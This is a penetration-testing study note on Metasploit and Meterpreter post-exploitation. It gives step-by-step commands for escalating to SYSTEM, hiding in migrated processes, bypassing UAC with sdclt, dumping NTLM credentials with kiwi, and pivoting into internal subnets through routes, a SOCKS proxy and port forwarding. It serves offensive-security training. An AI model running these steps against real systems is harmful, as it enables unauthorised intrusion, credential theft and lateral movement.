---
tags: metasploit, meterpreter
---
Once we gain access to a target machine, we can move on to the post-exploitation phase where we gather information, take steps to maintain our access, pivot to other machines, elevate our privileges, and so on.

## Core Meterpreter Post-Exploitation Features

First start an active Meterpreter session on our target

Check how long the user has been idle:
`idletime`
- If the user is idle for a long time, we can take this opportunity to execute programs or commands which may display a command-line window for a brief moment

Attempt to automatically elevate permissions to NT AUTHORITY\\SYSTEM (for Windows):
1. Start interactive shell:
   `shell`
2. Confirm that our user has either *SeImpersonatePrivilege* or *SeDebugPrivilege* assigned:
   `whoami /priv`
3. Exit shell:
   `exit`
4. Check the current UID:
   `getuid`
5. Elevate privileges:
   `getsystem`
6. Check that the new UID is elevated:
   `getuid`

Move the execution of our Meterpreter payload to a different process:
1. (In Meterpreter command prompt) View all running processes:
   `ps`
2. Migrate our current process to another process (must be of equal of lower privilege):
   `migrate [PID]`
3. (Optional) Check that our original process is not there anymore:
   `ps`
Note that after migration we will be running in the context of the newly migrated process.

Create a new process and migrate to that:
1. Create new process:
   `execute -H -f notepad`
	- `-H`: new process hidden from view
	- `-f notepad`: specify the command or program to run
2. Migrate to the newly spawned process:
   `migrate [PID]`
	- The PID should be shown in the output of the above command

> Meterpreter offers a variety of other interesting post-exploitation modules such as hashdump, which dumps the contents of the SAM database or screenshare, which displays the target machineâ€™s desktop in real-time.

## Post-Exploitation Modules

if the target user is a member of the local administrators group, we can elevate our shell to a high integrity level if we can bypass User Account Control (UAC)
1. Execute a Meterpreter payload binary on the target to get a Meterpreter shell
2. Elevate our privileges:
   `getsystem`
3. Migrate to another process:
   `ps`
   `migrate 8044`
   `getuid`
4. Check the integrity level of the current process:
   `shell`
   `powershell -ep bypass`
   `Import-Module NtObjectManager` (assuming the NtObjectManager module already exists on the target machine)
   `Get-NtTokenIntegrityLevel` (it's Medium in the example)
5. Background currently active channel and session:
   Ctrl + Z then `y`
   `bg`
6. Search for UAC bypass modules:
   `search UAC`\
7. One very effective UAC bypass on modern Windows systems is *exploit/windows/local/bypassuac_sdclt*, which targets the Microsoft binary **sdclt.exe**. This binary can be abused to bypass UAC by spawning a process with integrity level High.
   `use exploit/windows/local/bypassuac_sdclt`
8. Set the options:
   `show options`
   `set SESSION 9` (run it on the currently existing session)
   `set LHOST 192.168.119.4`
9. Run module:
   `run`
10. The module should have opened a new Meterpreter session. Check the integrity level of the process:
    `shell`
    `powershell -ep bypass`
    `Import-Module NtObjectManager` 
    `Get-NtTokenIntegrityLevel` (it's now High in the example)

Besides being able to background an active session and execute modules through it, we can also load extensions directly inside the active session with the load command.
E.g. Kiwi (extension in Meterpreter which provides Mimikatz functionalities)
1. Execute a Meterpreter payload binary on the target to get a Meterpreter shell
2. Elevate our privileges:
   `getsystem`
3. Load the **kiwi** module:
   `load kiwi`
4. Display commands of the kiwi module:
   `help`
5. Retrieve LM/NTLM creds:
   `creds_msv`

## Pivoting with Metasploit

1. Connect to the bind shell on the target
2. Identify other network interface(s):
   `ipconfig`
3. Start a meterpreter shell on target by downloading and executing a meterpreter payload binary
4. Background the Meterpreter session:
   `bg`
5. add a route to a network reachable through a compromised host
   `route add 172.16.5.0/24 12`
	- `172.16.5.0/24`: network information
	- `12`: the session that the route applies to
6. Display current routes:
   `route print`
7. Enumerate this subnet:
   `use auxiliary/scanner/portscan/tcp`
   `set RHOSTS 172.16.5.0/24`
   `set PORTS [range of ports to scan]`
   `run` (in the example, 172.161.5.200 has ports 445 and 3389 open)
8. Then, we can use Metasploit exploits on the open ports

### autoroute module
post-exploitation module to set up pivot routes through an existing Meterpreter session automatically

Remove all routes:
`route flush`

Show defined routes:
`route print`

Activate the autoroute module:
`use multi/manage/autoroute`

Set options:
`show options`
`set session [session ID]` (check session ID with `sessions -l`)

Run module: 
`run`

### server/socks_proxy module
auxiliary module to configure a SOCKS proxy. This allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default.

Activate module:
`use auxiliary/server/socks_proxy`

Set options:
`show options`
`set SRVHOST 127.0.0.1`
`set VERSION 5`

Run module:
`run -j` (in background)

Then, on our Kali machine, set up proxychains (see [[SSH Tunneling]]) and use as normal

### portfwd command
Meterpreter command which will forward a specific port to the internal network

Start interaction with session:
`session -i [session ID]`

Create port forward:
`portfwd add -l 3389 -p 3389 -r 172.16.5.200`
- `-l`: specify local host listening port
- `-p`: specify target port
- `-r`: specify target host

Then use commands on our Kali machine as normal

